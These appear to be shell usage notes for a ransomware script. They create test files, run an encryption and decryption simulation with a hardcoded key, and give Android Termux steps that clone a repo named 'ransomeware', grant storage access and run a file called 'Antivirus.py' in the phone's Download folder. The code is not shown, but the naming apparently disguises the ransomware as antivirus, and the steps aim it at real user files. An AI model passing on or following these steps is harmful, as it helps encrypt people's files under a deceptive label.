# Create test files
mkdir test_files
touch test_files/file{1..5}.txt
echo "Test content" > test_files/document.txt

# Run encryption
python3 ransomware_sim.py

# Run decryption
python3 ransomware_sim.py
# Enter key when prompted: Abhishek!234@#$


android :
pkg update && pkg upgrade
pkg install python
pkg install git
pip install pycryptodome
git clone https://github.com/Abhishek88911/ransomeware.git
cd ransomeware
python Antivirus.py
termux-setup-storage
cd /storage/emulated/0/Download
python Antivirus.py


pkg update && pkg upgrade
pkg install python
python3 -m venv myenv
source myenv/bin/activate
pip install pycryptodome
termux-setup-storage  # To access your phone's storage
